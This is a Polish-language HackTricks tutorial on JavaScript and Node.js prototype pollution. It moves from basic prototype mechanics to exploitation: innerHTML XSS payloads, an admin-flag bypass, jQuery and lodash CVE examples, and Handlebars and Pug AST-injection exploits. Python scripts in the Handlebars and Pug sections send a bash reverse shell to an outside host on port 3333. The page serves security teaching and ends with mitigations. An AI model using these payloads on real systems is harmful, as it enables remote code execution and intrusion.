# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Obiekty w JavaScript <a href="#053a" id="053a"></a>

Obiekty w JavaScript są w zasadzie kolekcjami par klucz-wartość, znanych jako właściwości. Obiekt można utworzyć za pomocą `Object.create` z argumentem `null`, aby utworzyć pusty obiekt. Ta metoda pozwala na utworzenie obiektu bez dziedziczonych właściwości.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Pusty obiekt jest podobny do pustego słownika, reprezentowanego jako `{}`.

### Funkcje i klasy w JavaScript

W JavaScript funkcje i klasy są ściśle powiązane, gdzie funkcje często pełnią rolę konstruktorów klas. Pomimo braku natywnego wsparcia dla klas w JavaScript, konstruktory mogą emulować zachowanie klas.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypy w JavaScript

JavaScript umożliwia modyfikację, dodawanie lub usuwanie atrybutów prototypu w czasie wykonywania. Ta elastyczność umożliwia dynamiczne rozszerzanie funkcjonalności klasy.

Funkcje takie jak `toString` i `valueOf` mogą być zmieniane, aby zmienić ich zachowanie, co pokazuje elastyczność systemu prototypów w JavaScript.

## Dziedziczenie

W programowaniu opartym na prototypach, właściwości/metody są dziedziczone przez obiekty z klas. Te klasy są tworzone poprzez dodawanie właściwości/metod do instancji innej klasy lub do pustego obiektu.

Należy zauważyć, że gdy do obiektu służącego jako prototyp dla innych obiektów (takiego jak `myPersonObj`) dodawana jest właściwość, dziedziczące obiekty zyskują dostęp do tej nowej właściwości. Jednak ta właściwość nie jest automatycznie wyświetlana, chyba że zostanie jawnie wywołana.

## Zanieczyszczenie \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

## Badanie zanieczyszczenia prototypu w JavaScript

Obiekty JavaScript są definiowane przez pary klucz-wartość i dziedziczą po prototypie JavaScript Object. Oznacza to, że zmiana prototypu Object może wpływać na wszystkie obiekty w środowisku.

Przyjrzyjmy się innemu przykładowi, aby to zilustrować:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Dostęp do prototypu obiektu jest możliwy poprzez:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Dodając właściwości do prototypu Object, każdy obiekt JavaScript odziedziczy te nowe właściwości:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## zanieczyszczenie prototypu

W przypadku, gdy korzystanie z `__proto__` jest ograniczone, modyfikowanie prototypu funkcji stanowi alternatywę:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
To wpływa tylko na obiekty utworzone za pomocą konstruktora `Vehicle`, nadając im właściwości `beep`, `hasWheels`, `honk` i `isElectric`.

Dwa sposoby globalnego wpływania na obiekty JavaScript poprzez zanieczyszczanie prototypu obejmują:

1. Bezpośrednie zanieczyszczanie `Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Zanieczyszczanie prototypu konstruktora dla powszechnie używanej struktury:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Po tych operacjach każdy obiekt JavaScript może wykonywać metody `goodbye` i `greet`.

## Zanieczyszczanie innych obiektów

### Z klasy do Object.prototype

W scenariuszu, w którym możesz **zanieczyścić określony obiekt** i musisz **dostać się do `Object.prototype`**, możesz go wyszukać za pomocą kodu podobnego do poniższego:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Zanieczyszczanie elementów tablicy

Należy zauważyć, że w JS można zanieczyścić atrybuty obiektów, a jeśli masz dostęp do zanieczyszczenia tablicy, możesz również **zanieczyścić wartości tablicy** dostępne **poprzez indeksy** (należy zauważyć, że nie można nadpisać wartości, dlatego trzeba zanieczyścić indeksy, które są w jakiś sposób używane, ale nie zapisywane).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Zanieczyszczenie elementów HTML

Podczas generowania elementu HTML za pomocą JS można **nadpisać** atrybut **`innerHTML`**, aby umożliwić wpisywanie **dowolnego kodu HTML**. [Pomysł i przykład pochodzą z tego opracowania](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Przykłady

### Podstawowy przykład

Zanieczyszczenie prototypu występuje z powodu błędu w aplikacji, który umożliwia nadpisanie właściwości na `Object.prototype`. Oznacza to, że większość obiektów dziedziczy swoje właściwości z `Object.prototype`.

Najprostszym przykładem jest dodanie wartości do **niezdefiniowanego atrybutu obiektu**, który zostanie sprawdzony, na przykład:
```javascript
if (user.admin) {
```
Jeśli atrybut **`admin` jest niezdefiniowany**, istnieje możliwość wykorzystania PP i ustawienia go na wartość True za pomocą czegoś takiego jak:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mechanizm polega na manipulowaniu właściwościami w taki sposób, że jeśli atakujący ma kontrolę nad określonymi danymi wejściowymi, może zmodyfikować prototyp wszystkich obiektów w aplikacji. Manipulacja ta zazwyczaj polega na ustawieniu właściwości `__proto__`, która w języku JavaScript jest synonimem bezpośredniej modyfikacji prototypu obiektu.

Warunki, w których ten atak może być skutecznie wykonany, jak opisano w konkretnej [studi](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), obejmują:

- Wykonywanie rekurencyjnego scalania.
- Definiowanie właściwości na podstawie ścieżki.
- Klonowanie obiektów.


### Nadpisanie funkcji
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution do RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Proto Pollution po stronie klienta do XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: Atak prototype pollution poprzez jQuery $ .extend

[Aby uzyskać więcej informacji, sprawdź ten artykuł](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
W jQuery funkcja `$ .extend` może prowadzić do prototype pollution, jeśli funkcja kopiowania głębokiego jest niewłaściwie wykorzystywana. Ta funkcja jest często używana do klonowania obiektów lub łączenia właściwości z domyślnego obiektu. Jednak gdy jest źle skonfigurowana, właściwości przeznaczone dla nowego obiektu mogą zostać przypisane do prototypu. Na przykład:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Ta podatność, zidentyfikowana jako CVE-2019-11358, ilustruje, jak głęboka kopia może niechcący modyfikować prototyp, co prowadzi do potencjalnych zagrożeń dla bezpieczeństwa, takich jak nieautoryzowany dostęp administratora, jeśli właściwości takie jak `isAdmin` są sprawdzane bez odpowiedniej weryfikacji istnienia.

### CVE-2018-3721, CVE-2019-10744: Atak zanieczyszczenia prototypu za pomocą lodash

[Aby uzyskać więcej szczegółów, sprawdź ten artykuł](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) napotkał podobne podatności na zanieczyszczenie prototypu (CVE-2018-3721, CVE-2019-10744). Te problemy zostały rozwiązane w wersji 4.17.11.

### Inny samouczek z CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Zanieczyszczenie prototypu AST w NodeJS

NodeJS szeroko wykorzystuje drzewa składni abstrakcyjnej (AST) w języku JavaScript do funkcji takich jak silniki szablonów i TypeScript. Ta sekcja omawia podatności związane z zanieczyszczeniem prototypu w silnikach szablonów, w szczególności Handlebars i Pug.

#### Analiza podatności Handlebars

Silnik szablonów Handlebars jest podatny na atak zanieczyszczenia prototypu. Ta podatność wynika z konkretnych funkcji w pliku `javascript-compiler.js`. Na przykład funkcja `appendContent` łączy `pendingContent`, jeśli jest obecna, podczas gdy funkcja `pushSource` resetuje `pendingContent` na `undefined` po dodaniu źródła.

##### Proces wykorzystania

Wykorzystanie polega na wykorzystaniu drzewa składni abstrakcyjnej (AST), które jest generowane przez Handlebars, postępując według tych kroków:

1. **Manipulacja analizatorem**: Na początku analizator, za pomocą węzła `NumberLiteral`, wymusza, że wartości są numeryczne. Zanieczyszczenie prototypu może ominąć to, umożliwiając wstawienie nie-numerycznych ciągów znaków.
2. **Obsługa przez kompilator**: Kompilator może przetwarzać obiekt AST lub szablon w postaci ciągu znaków. Jeśli `input.type` jest równe `Program`, wejście jest traktowane jako wcześniej sparsowane, co można wykorzystać.
3. **Wstrzyknięcie kodu**: Poprzez manipulację `Object.prototype`, można wstrzyknąć dowolny kod do funkcji szablonu, co może prowadzić do zdalnego wykonania kodu.

Przykład demonstrujący wykorzystanie podatności Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ten kod pokazuje, jak atakujący może wstrzyknąć dowolny kod do szablonu Handlebars.

**Odnośnik zewnętrzny**: Znaleziono problem związany z zanieczyszczeniem prototypu w bibliotece 'flat', szczegóły można znaleźć tutaj: [Problem na GitHubie](https://github.com/hughsk/flat/issues/105).

**Odnośnik zewnętrzny**: [Problem związany z zanieczyszczeniem prototypu w bibliotece 'flat'](https://github.com/hughsk/flat/issues/105)

Przykład wykorzystania zanieczyszczenia prototypu w Pythonie:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Podatność Pug

Pug, inny silnik szablonów, narażony jest na podobne ryzyko związane z zanieczyszczeniem prototypu. Szczegółowe informacje są dostępne w dyskusji na temat [Wstrzykiwania AST w Pug](https://blog.p6.is/AST-Injection/#Pug).

Przykład zanieczyszczenia prototypu w Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Środki zapobiegawcze

Aby zminimalizować ryzyko zanieczyszczenia prototypu, można zastosować poniższe strategie:

1. **Niezmiennosć obiektu**: `Object.prototype` można uczynić niemutowalnym poprzez zastosowanie `Object.freeze`.
2. **Walidacja danych wejściowych**: Dane JSON powinny być rygorystycznie walidowane zgodnie z schematem aplikacji.
3. **Bezpieczne funkcje scalające**: Należy unikać niebezpiecznego użycia rekurencyjnych funkcji scalających.
4. **Obiekty bez prototypu**: Obiekty bez właściwości prototypu można tworzyć za pomocą `Object.create(null)`.
5. **Użycie Map**: Zamiast `Object`, należy używać `Map` do przechowywania par klucz-wartość.
6. **Aktualizacje bibliotek**: Regularne aktualizowanie bibliotek pozwala na włączenie poprawek związanych z bezpieczeństwem.
7. **Linter i narzędzia analizy statycznej**: Używaj narzędzi takich jak ESLint z odpowiednimi wtyczkami do wykrywania i zapobiegania podatnościom na zanieczyszczenie prototypu.
8. **Przeglądy kodu**: Przeprowadzaj dokładne przeglądy kodu w celu identyfikacji i usuwania potencjalnych zagrożeń związanych z zanieczyszczeniem prototypu.
9. **Szkolenia z bezpieczeństwa**: Edukuj programistów na temat ryzyka zanieczyszczenia prototypu i najlepszych praktyk pisania bezpiecznego kodu.
10. **Ostrożne korzystanie z bibliotek**: Bądź ostrożny podczas korzystania z bibliotek osób trzecich. Oceń ich postawę w zakresie bezpieczeństwa i przejrzyj ich kod, zwłaszcza te manipulujące obiektami.
11. **Ochrona w czasie wykonywania**: Wykorzystuj mechanizmy ochrony w czasie wykonywania, takie jak używanie pakietów npm skoncentrowanych na bezpieczeństwie, które mogą wykrywać i zapobiegać atakom zanieczyszczenia prototypu.

## Odwołania

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
